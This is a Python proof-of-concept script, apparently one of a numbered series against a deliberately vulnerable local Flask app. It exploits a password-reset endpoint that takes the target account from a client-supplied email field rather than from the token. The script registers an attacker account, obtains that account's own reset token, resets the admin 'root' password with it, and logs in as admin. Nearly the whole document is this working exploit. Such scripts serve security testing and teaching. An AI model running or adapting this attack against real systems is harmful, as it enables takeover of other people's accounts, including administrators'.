"""
Attack #8 — BROKEN ACCOUNT BINDING / IDOR ON RESET  (CWE-639 / CWE-640)
Target: POST /reset-password on the vulnerable Flask app (127.0.0.1:5000)

Premise
-------
/reset-password decides WHICH account to reset from a client-supplied field,
not from the token:

    target_email = data.get("email", row["email"])   # trusts the client
    UPDATE users SET password=? WHERE email=?         # ...over the token

So a token that was legitimately issued for the ATTACKER'S OWN account is
accepted to reset ANY OTHER user's password -- the attacker just names the
victim in the "email" field. The token proves "someone started a reset",
but the code never checks that the token belongs to the account being
changed. This is the System 6 headline: the reset's authorization is
completely decoupled from its target.

This is NOT a factor-strength problem (the token can be perfectly random and
this still works) and NOT the rate-limit class. It is a pure authorization /
object-binding failure -- new territory for this series.

What this script proves
-----------------------
The attacker registers a normal, unprivileged account, requests a reset for
THAT account (a token they are fully entitled to), then uses it to overwrite
the ADMIN 'root' account's password -- and logs in as root. Full admin
takeover with a token the attacker legitimately owns.

Runs unmodified against a fresh instance (seeded admin: root@corp.example).
"""

import requests

BASE = "http://127.0.0.1:5000"

ATTACKER_EMAIL = "attacker@evil.example"
ATTACKER_PW = "attacker_own_pw"
VICTIM_ADMIN = "root@corp.example"       # the account the attacker does NOT own
ATTACKER_CHOSEN_PW = "i_now_own_root_1"


def main():
    print("=" * 68)
    print("ATTACK #8 - IDOR / broken account binding on password reset")
    print("Target:", BASE)
    print("=" * 68)

    # Step 0: baseline - attacker cannot log into root.
    pre = requests.post(f"{BASE}/login", json={"email": VICTIM_ADMIN, "password": ATTACKER_CHOSEN_PW})
    print(f"\n[*] Baseline: login to {VICTIM_ADMIN} with attacker's password "
          f"-> HTTP {pre.status_code} (expected 401)")

    # Step 1: attacker registers a normal account they fully control.
    requests.post(f"{BASE}/register", json={
        "username": "attacker", "email": ATTACKER_EMAIL, "password": ATTACKER_PW})
    print(f"[*] Attacker registered own account: {ATTACKER_EMAIL}")

    # Step 2: attacker requests a reset for THEIR OWN account -> a token they
    # are 100% entitled to. (They can read it from their own inbox.)
    requests.post(f"{BASE}/forgot-password", json={"email": ATTACKER_EMAIL})
    token = requests.get(f"{BASE}/outbox").json()[ATTACKER_EMAIL]["token"]
    print(f"[*] Attacker got a legitimate reset token for their OWN account: {token}")

    # Step 3: THE ATTACK. Use the attacker's own token, but name the ADMIN in
    # the 'email' field. The server binds the reset to the client-named
    # account, not to the token's real owner.
    print(f"\n[*] Submitting attacker's token but with \"email\":\"{VICTIM_ADMIN}\":")
    r = requests.post(f"{BASE}/reset-password", json={
        "token": token,
        "new_password": ATTACKER_CHOSEN_PW,
        "email": VICTIM_ADMIN,          # <-- the whole exploit is this one line
    })
    print(f"    server -> HTTP {r.status_code}: {r.text.strip()}")

    # Step 4: payoff - log into the admin account with the attacker's password.
    post = requests.post(f"{BASE}/login", json={"email": VICTIM_ADMIN, "password": ATTACKER_CHOSEN_PW})
    print(f"\n[*] Login to {VICTIM_ADMIN} with attacker's chosen password:")
    print(f"    -> HTTP {post.status_code}: {post.text.strip()}")

    print("\n" + "-" * 68)
    body = post.json() if post.status_code == 200 else {}
    if post.status_code == 200 and body.get("is_admin") is True:
        print("[+] ATTACKER GAIN - full ADMIN takeover using a reset token the")
        print("    attacker legitimately owns for their OWN account. The reset was")
        print("    bound to a client-supplied email, never to the token. A random,")
        print("    single-use, short-lived token would NOT fix this. (CWE-639)")
    else:
        print("[-] Takeover did not occur - target does not appear vulnerable.")
    print("-" * 68)


if __name__ == "__main__":
    main()
